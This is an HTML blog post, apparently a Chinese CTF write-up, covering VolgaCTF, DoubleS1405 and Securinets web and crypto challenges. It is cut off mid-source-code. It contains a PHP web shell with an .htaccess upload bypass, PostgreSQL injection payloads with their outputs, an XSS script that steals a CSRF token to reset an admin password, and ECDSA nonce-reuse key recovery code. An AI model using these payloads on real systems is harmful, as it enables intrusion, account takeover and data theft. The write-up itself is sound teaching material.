@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      VolgaCTF DoubleS1405 Securinets 部分题 wp | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="上周末出去浪了一天多。等回来时发现有三个比赛，看题目时便都快结束了，挑着几道还可以的做了下，有些太脑洞直接跳过了 = =  VolgaCTF - WebVC - 50 pts There are files A.png and B.png. But where’s the flag?  题目给了两张图片，自然而然的想到异或，直接丢到 stegsolve 里异或下就出来了 Share Point -">
+<meta name="keywords" content="CTF,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VolgaCTF DoubleS1405 Securinets 部分题 wp | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2017/03/29/VolgaCTF-DoubleS1405-Securinets-部分题-wp/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="上周末出去浪了一天多。等回来时发现有三个比赛，看题目时便都快结束了，挑着几道还可以的做了下，有些太脑洞直接跳过了 = =  VolgaCTF - WebVC - 50 pts There are files A.png and B.png. But where’s the flag?  题目给了两张图片，自然而然的想到异或，直接丢到 stegsolve 里异或下就出来了 Share Point -">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/VolgaCTF_DoubleS1405_Securinets.png">
+<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="VolgaCTF DoubleS1405 Securinets 部分题 wp | HeartSky&#39;s blog">
+<meta name="twitter:description" content="上周末出去浪了一天多。等回来时发现有三个比赛，看题目时便都快结束了，挑着几道还可以的做了下，有些太脑洞直接跳过了 = =  VolgaCTF - WebVC - 50 pts There are files A.png and B.png. But where’s the flag?  题目给了两张图片，自然而然的想到异或，直接丢到 stegsolve 里异或下就出来了 Share Point -">
+<meta name="twitter:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/VolgaCTF_DoubleS1405_Securinets.png">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">VolgaCTF DoubleS1405 Securinets 部分题 wp</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-03-29" class="post-meta__date date">2017-03-29</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/CTF-writeup/">CTF,writeup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>上周末出去浪了一天多。等回来时发现有三个比赛，看题目时便都快结束了，挑着几道还可以的做了下，有些太脑洞直接跳过了 = = </p>
+<h2 id="VolgaCTF-Web"><a href="#VolgaCTF-Web" class="headerlink" title="VolgaCTF - Web"></a><a href="https://quals.2017.volgactf.ru" target="_blank" rel="external">VolgaCTF</a> - Web</h2><h3 id="VC-50-pts"><a href="#VC-50-pts" class="headerlink" title="VC - 50 pts"></a>VC - 50 pts</h3><blockquote>
+<p>There are files A.png and B.png. But where’s the flag?</p>
+</blockquote>
+<p>题目给了两张图片，自然而然的想到异或，直接丢到 stegsolve 里异或下就出来了</p>
+<h3 id="Share-Point-200-pts"><a href="#Share-Point-200-pts" class="headerlink" title="Share Point - 200 pts"></a>Share Point - 200 pts</h3><blockquote>
+<p>Look! I wrote a good service for sharing your files with your friends, enjoy)<br><a href="http://share-point.quals.2017.volgactf.ru" target="_blank" rel="external">http://share-point.quals.2017.volgactf.ru</a></p>
+</blockquote>
+<p>没有注册功能，可以任意登录。登陆之后可以上传文件和分享文件，测试了下只检测了文件后缀名，而且是黑名单，但是常见的后缀包括 php3、phtml、pht 什么的都不行。注意到一个细节，上传的文件被保存在了 <code>/files/username/</code> 下，那么这里就有一个利用姿势。正好是前几天在 <a href="http://paper.seebug.org/92/" target="_blank" rel="external">seebug</a> 上看到的，如果我们上传一个 .htaccess 文件，让它把我们自定义的一个文件解析为 php，那么就可以了</p>
+<p>.htaccess<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch “test.jpg”&gt;  </span><br><span class="line">SetHandler application/x-httpd-php  </span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure></p>
+<p>或者直接让它解析 jpg 这个后缀<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure></p>
+<p>然后上传一个 WebShell<br>233.jpg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>最后 flag 的位置有点没想到，在 /opt 目录下，记得上次国科大的线下赛 flag 也是在这个目录下，难道有什么不为人知的交易？</p>
+<h3 id="Bloody-Feedback-100-pts"><a href="#Bloody-Feedback-100-pts" class="headerlink" title="Bloody Feedback - 100 pts"></a>Bloody Feedback - 100 pts</h3><blockquote>
+<p>Bloody Feedback<br>Send your feedback at <a href="http://bloody-feedback.quals.2017.volgactf.ru" target="_blank" rel="external">http://bloody-feedback.quals.2017.volgactf.ru</a><br>DO. NOT. USE. SQLMAP<br>Otherwise your IP will be banned</p>
+</blockquote>
+<p>题目说不让用 sqlmap，那就是 sql 注入咯<br>进去看一下，可以提交一个反馈，会返回这样的 <code>T4XRn8Q11kXSHmNILgD9LzT3AKOcrPRS</code> 一个消息的标志，并且在 get 参数中，起初以为是这里有注入，结果发现怎么样都不行，而且查询不到指定的消息时返回的都是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Wrong code at Worker.pm line 62.</span><br></pre></td></tr></table></figure></p>
+<p>据说可以看出是 perl 脚本，反正我没看出来<br>那么注入点应该不在这里，回到表单，测试之后发现了 email 处有猫腻(除了 email 的其他地方输入都被转义了)，当我提交一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;;echo &apos;233</span><br></pre></td></tr></table></figure></p>
+<p>的时候，返回了这样一个错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: DBD::Pg::db do failed: ERROR: syntax error at or near &quot;echo&quot; LINE 1: ...(&apos;OVYZYOD8wYDgmm89n6BGqNxbp23mY5hP&apos;,&apos;333&apos;,&apos;sad&apos;,&apos;&apos;echo &apos;233&apos;... ^ at Worker.pm line 29.</span><br></pre></td></tr></table></figure></p>
+<p>这应该是一个数据库中的插入语句，搜了下是 PostgreSQL 数据库，然后这里是 insert 语句，继续尝试下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;);--</span><br><span class="line">ERROR: DBD::Pg::db do failed: ERROR:  INSERT has more target columns than expressions</span><br><span class="line">LINE 1: INSERT INTO messages (code,name,message,email,status) VALUES... ^ at Worker.pm line 29.</span><br></pre></td></tr></table></figure></p>
+<p>知道了后台怎么写的后，我们就可以构造我们的注入语句了<br>获取数据库名(pg_database 表存储了所有的数据库信息)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;,(select datname from pg_database limit 1 offset 3));--</span><br><span class="line">feedback_db</span><br></pre></td></tr></table></figure></p>
+<p>表名(pg_tables 表存储了所有的表信息)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;,(select tablename from pg_tables limit 1 offset 0));--</span><br><span class="line">messages s3cret_tabl3</span><br></pre></td></tr></table></figure></p>
+<p>s3cret_tabl3 表名的 oid(因为 pg_class.oid 对应 pg_attribute.attrelid，所以我们可以获取目标表的 oid，然后在 pg_attribute 表中得到 attname 的值，即为列名)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;,(select oid from pg_class where relname like &apos;s3cret_tabl3&apos; limit 1 offset 0));--</span><br><span class="line">16435</span><br></pre></td></tr></table></figure></p>
+<p>列名(pg_attribute 存储了所有的列信息；直接用 attrelid 时提示 <code>没有匹配指定名称和参数类型的操作符. 您也许需要增加明确的类型转换</code>，用 cast 把前面的转换为字符串类型就可以了)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;,(select attname from pg_attribute where cast(attrelid as varchar(15)) like </span><br><span class="line">&apos;16435&apos;limit 1 offset 0));--</span><br><span class="line">s3cr3tc0lumn</span><br></pre></td></tr></table></figure></p>
+<p>获取数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;,(select s3cr3tc0lumn from s3cret_tabl3 limit 1 offset 4));--</span><br><span class="line">VolgaCTF&#123;eiU7UJhyeu@ud3*&#125;</span><br></pre></td></tr></table></figure></p>
+<p>注意：</p>
+<ol>
+<li>where 好像被 ban 了，可以用 like 来代替</li>
+<li>也可以不用 pg 中特殊的系统表，采用 information_schema.tables，和 MySQL 中的用法是一模一样的，只是有一个小问题，在 PostgreSQL 中，information_schema 并非一个真正的数据库，如果在 test 数据库中新建一个 test 表，进入其他数据库，然后 <code>select table_name from information_schema.tables;</code> 是查询不到 test 这个表的。所以如果 flag 在另一个数据库的话就只能用 pg 中的特殊类表了</li>
+</ol>
+<p>这题还是可以的，学到了基本的 PostgreSQL 注入知识</p>
+<h3 id="Sneaky-Tags-300-pts"><a href="#Sneaky-Tags-300-pts" class="headerlink" title="Sneaky Tags - 300 pts"></a>Sneaky Tags - 300 pts</h3><blockquote>
+<p>We created a great service for you (Alpha version, work in progress), don’t hesitate to use it.<br>administrator is hiding something in his tags<br><a href="http://sneaky-tags.quals.2017.volgactf.ru:8080" target="_blank" rel="external">http://sneaky-tags.quals.2017.volgactf.ru:8080</a></p>
+</blockquote>
+<p>目标是获得 administrator 的 tags，进去后发现又是没有注册，只有登录界面，除了 administrator 的会验证密码，其他用户都可以随意登入，然后习惯性的试了 123，结果直接看到了别人留下的做题记录，拿到了 flag……</p>
+<p>好吧，还是分析下<br>登陆进去后有三个功能，分别是创建标签、同步标签到推特、搜索某标签是否同步到了推特，测试下发现创建标签处不存在 xss，想下应该不是真正的推送到推特，而是插入到自己的数据库中，但正常的插入我这都不成功，转向搜索功能，结合 js，这里应该是一个 <code>select * from xxx where xxxxx = tag</code> 这样的语句，如果我们在创建标签的时候就构造恶意语句的话……</p>
+<p>还没来得及测试环境就关了……</p>
+<h3 id="Corp-News-300-pts"><a href="#Corp-News-300-pts" class="headerlink" title="Corp News - 300 pts"></a>Corp News - 300 pts</h3><blockquote>
+<p>We have created an excellent service for obtaining corporate news. You never know the secret information<br><a href="http://corp-news.quals.2017.volgactf.ru" target="_blank" rel="external">http://corp-news.quals.2017.volgactf.ru</a><br><a href="http://corp-news2.quals.2017.volgactf.ru" target="_blank" rel="external">http://corp-news2.quals.2017.volgactf.ru</a><br>Hints<br>Some errors may shed light on what is there on the backend</p>
+</blockquote>
+<p>打开后又是登录时直接注册的页面，比较坑的是密码的要求给的是 <code>[a-zA-Zd]{7,}</code>，一直说不符合要求，结果原来是大小写数字都要有 ==</p>
+<p>进入后有这么几个功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">change_password 修改密码(有csrf保护)</span><br><span class="line">feedback 提交评论</span><br><span class="line">news 查看私密新闻</span><br></pre></td></tr></table></figure></p>
+<p>其中查看新闻这个功能 post 了一个这样的 <code>{&quot;resultFormat&quot;:&quot;text&quot;}</code> json数据，返回的是 <code>{&quot;Status&quot;:&quot;OK&quot;,&quot;message&quot;:&quot;Please, set debug header true, becouse the app in developing state:)&quot;}</code>，尝试把 resultFormat 的值改为其他的，结果返回的都是这样 <code>{&quot;status&quot;:500,&quot;message&quot;:&quot;`result_format` (texsdfsdft) is not recognized, (&#39;auto&#39;, &#39;json&#39;, &#39;jsonp&#39;, &#39;text&#39;, and &#39;binary&#39; are allowed).&quot;}</code>，感觉这里是有问题的，于是搜了下 <code>result_format  and options</code>，找到一篇<a href="https://rethinkdb.com/api/python/http/" target="_blank" rel="external">文章</a>。应该是 RethinkDB 这个数据库的语法，看到可以构造 header 头，于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request</span><br><span class="line">&#123;&quot;resultFormat&quot;:&quot;text&quot;,&quot;header&quot;:&#123;&quot;debug&quot;:&quot;true&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">response</span><br><span class="line">&#123;&quot;Status&quot;:&quot;OK&quot;,&quot;message&quot;:&quot;VolgaCTF is an international inter-university cybersecurity competition organised by a group of IT enthusiasts based in Samara, Russia.VolgaCTF 2017 Quals is an online competition. Top teams will be invited to participate in VolgaCTF 2017 Finals, which will be held in Samara, Russia.Registration for the competition will be opened at the end of February.&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>现在可以看新闻了，但是并没有什么用<br>应该是可以看到管理员的名字的，结合修改密码功能，猜测可以发送留言来修改管理员的密码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(<span class="string">"GET"</span>, <span class="string">"/lk"</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            text = xhr.responseText;</span><br><span class="line">            text = text.substr(text.indexOf(<span class="string">'invisible"&gt;'</span>) + <span class="string">'invisible"&gt;'</span>.length);</span><br><span class="line">            csrf = text.substr(<span class="number">0</span>, text.indexOf(<span class="string">'&lt;/p&gt;'</span>));</span><br><span class="line">            data = <span class="built_in">JSON</span>.stringify(&#123;<span class="string">'new_password'</span>:<span class="string">'aaaAAA11'</span>,<span class="attr">confirm_password</span>:<span class="string">'aaaAAA11'</span>,<span class="string">'token'</span>:csrf&#125;);</span><br><span class="line">            xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">            xhr2.open(<span class="string">"POST"</span>, <span class="string">"/change_password"</span>, <span class="literal">true</span>);</span><br><span class="line">            xhr2.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/json"</span>);</span><br><span class="line">            xhr2.send(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.send();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>登陆上去后会有一条信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Secret header: asdJHF7dsJF65$FKFJjfjd773ehd5fjsdf7</span><br></pre></td></tr></table></figure></p>
+<p>然后用前面的方式构造头就可以拿到 flag 了</p>
+<h2 id="VolgaCTF-Crypto"><a href="#VolgaCTF-Crypto" class="headerlink" title="VolgaCTF - Crypto"></a><a href="https://quals.2017.volgactf.ru" target="_blank" rel="external">VolgaCTF</a> - Crypto</h2><h3 id="Curved-200-pts"><a href="#Curved-200-pts" class="headerlink" title="Curved - 200 pts"></a>Curved - 200 pts</h3><blockquote>
+<p>This server is willing to perform several commands and cat is among them. However, to execute cat flag we need to provide the signature. We only have signatures for exit and leave commands which is cruelly ironic. Can you help us to get the flag?<br>curved_server.py<br>exit.sig<br>key.public<br>leave.sig<br>curved.quals.2017.volgactf.ru:8786</p>
+</blockquote>
+<p>这道题是 ECDSA(椭圆曲线数字签名算法)，我们有 <code>exit</code> 和 <code>leave</code> 的数字签名，要计算出 <code>cat flag</code> 的数字签名，和之前的数论基础题有点像</p>
+<p><del>简单的说一下这个算法的步骤</del>懒得写了，直接贴下<a href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm" target="_blank" rel="external">维基百科</a>的<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/VolgaCTF_DoubleS1405_Securinets.png" alt=""><br>所以当 r、d 相同，有两组数字签名数据时是可以恢复 k、d 的，然后就可以生成我们想要信息的数字签名了<br>附关键代码：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    r = <span class="number">9540946282644423304958237178123966732301592745413906651991128246584667628620778601005222874778554839816137094172414</span></span><br><span class="line">    curve = G.curve</span><br><span class="line">    n = curve.n</span><br><span class="line">    Ln = bit_length(n)</span><br><span class="line">    cmd1 = <span class="string">'exit'</span></span><br><span class="line">    cmd2 = <span class="string">'leave'</span></span><br><span class="line">    z1 = int(hashlib.sha512(cmd1).hexdigest(), <span class="number">16</span>) &gt;&gt; <span class="number">512</span> - Ln</span><br><span class="line">    z2 = int(hashlib.sha512(cmd2).hexdigest(), <span class="number">16</span>) &gt;&gt; <span class="number">512</span> - Ln</span><br><span class="line">    (r1, s1) = import_cmd_signature(cmd1, <span class="string">'.'</span>)</span><br><span class="line">    (r2, s2) = import_cmd_signature(cmd2, <span class="string">'.'</span>)</span><br><span class="line">    k = (z1 - z2) * invert(s1 - s2, n) % n</span><br><span class="line">    d = int(((s1 * k - z1 % n) * invert(r, n)) % n)</span><br><span class="line">    signature = ECDSA(G, d)</span><br><span class="line">    cmd = <span class="string">'cat flag'</span></span><br><span class="line">    r, s = signature.sign(cmd)</span><br><span class="line">    <span class="keyword">print</span> r</span><br><span class="line">    <span class="keyword">print</span> s</span><br></pre></td></tr></table></figure></p>
+<h2 id="DoubleS1405-2nd-CTF-Web"><a href="#DoubleS1405-2nd-CTF-Web" class="headerlink" title="DoubleS1405 2nd CTF - Web"></a><a href="http://doubles1405.com/" target="_blank" rel="external">DoubleS1405 2nd CTF</a> - Web</h2><h3 id="blackout-50-pts"><a href="#blackout-50-pts" class="headerlink" title="blackout - 50 pts"></a>blackout - 50 pts</h3><p>看题目名字就知道了，blackout-停电，进去一看果然什么也没有，那就是备份文件喽，是.index.php.swp，然后 strings 一下就找到了<br>Tips: .xxx.swp 是在用 vim 编辑的时候在还未保存的情况下，电脑断电或者 vim 发生异常退出时的缓冲区备份文件</p>
+<h3 id="iterator-100-pts"><a href="#iterator-100-pts" class="headerlink" title="iterator - 100 pts"></a>iterator - 100 pts</h3><p>打开就是源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$directory = $_GET[<span class="string">'dir'</span>];</span><br><span class="line">$cond = explode(<span class="string">"="</span>, urldecode($_SERVER[<span class="string">'QUERY_STRING'</span>]));</span><br><span class="line"><span class="keyword">if</span> (!is_dir($cond[<span class="number">1</span>])) <span class="keyword">echo</span> <span class="string">'folder does not exist.'</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    $directory = <span class="keyword">new</span> DirectoryIterator($directory);</span><br><span class="line">    <span class="keyword">foreach</span>($directory <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n&lt;!--"</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/txt$/i"</span>, $file-&gt;getFilename())) <span class="keyword">echo</span> $file-&gt;getFilename();</span><br><span class="line">        <span class="keyword">else</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"--&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个好像挺有意思的，不过不知道怎么做，有知道的大佬请告诉我</p>
+<h2 id="Securinets-Web"><a href="#Securinets-Web" class="headerlink" title="Securinets - Web"></a><a href="https://www.ctfsecurinets.com/" target="_blank" rel="external">Securinets</a> - Web</h2><h3 id="Web6-300-pts"><a href="#Web6-300-pts" class="headerlink" title="Web6 - 300 pts"></a>Web6 - 300 pts</h3><p>有源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $db);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $pass;</span><br><span class="line">    <span class="keyword">public</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($id,$uname,$pass,$key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=htmlspecialchars($id);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=htmlspecialchars($uname);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass=htmlspecialchars($pass);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key=htmlspecialchars($key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$msg=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) || <span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $uname=mysqli_real_escape_string($conn,$_POST[<span class="string">'username'</span>]);</span><br><span class="line">        $pass=md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $user = unserialize($_COOKIE[<span class="string">'user'</span>]);</span><br><span class="line">        $uname=$user-&gt;name;</span><br><span class="line">        $pass=$user-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = <span class="string">"SELECT id, username, pass,userkey FROM user where username = '"</span>.$uname.<span class="string">"' AND pass='"</span>.$pass.<span class="string">"'"</span>;</span><br><span 